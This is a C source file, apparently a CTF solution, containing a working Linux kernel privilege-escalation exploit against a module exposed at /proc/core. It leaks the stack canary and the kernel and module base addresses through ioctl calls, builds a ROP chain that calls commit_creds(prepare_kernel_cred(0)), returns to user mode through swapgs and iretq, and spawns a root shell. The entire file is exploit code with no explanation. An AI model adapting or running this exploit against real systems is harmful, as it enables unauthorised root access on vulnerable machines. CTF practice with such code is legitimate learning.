#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(void){
    system("/bin/sh");
}
//eip =(unsigned long long) get_shell;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}

void setoff(int fd,int off){
	ioctl(fd,0x6677889C,off);
}

void core_read(int fd,char *buf){
	ioctl(fd,0x6677889B,buf);
}

void core_copy(int fd , unsigned long long len){
	ioctl(fd, 0x6677889A,len);
}

int main(void){
	save_stats() ; 
	unsigned long long buf[0x40/8];
	memset(buf,0,0x40);
	unsigned long long canary ;
	unsigned long long module_base ;
	unsigned long long vmlinux_base ; 
	unsigned long long iretq ;
	unsigned long long swapgs ;
	unsigned long long rop[0x30];
	memset(buf,0,0x30*8);
	int fd = open("/proc/core",O_RDWR);
	if(fd == -1){
		printf("open file error\n");
		exit(0);
	}
	else{
		printf("open file success\n");
	}
	printf("[*] buf: 0x%p",buf);
	setoff(fd,0x40);
	core_read(fd,buf);
	canary = buf[0];
	module_base =  buf[2] - 0x19b;
	vmlinux_base = buf[4] - 0x16684f0;
	printf("[*] canary: 0x%p",canary);
	printf("[*] module_base: 0x%p",module_base);
	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
	commit_creds = vmlinux_base + 0x9c8e0;
	prepare_kernel_cred = vmlinux_base + 0x9cce0;
	iretq = vmlinux_base + 0x50ac2;
	swapgs  = module_base + 0x0d6;
	rop[8] = canary ; 
	rop[10] = payload;
	rop[11] = swapgs;
	rop[12] = 0;
	rop[13] = iretq ;
	rop[14] = get_shell ; 
	rop[15] = user_cs;
	rop[16] = user_eflags;
	rop[17] = user_sp;
	rop[18] = user_ss;
	rop[19] = 0;
	write(fd,rop,0x30*8);
	core_copy(fd,0xf000000000000000+0x30*8);
}

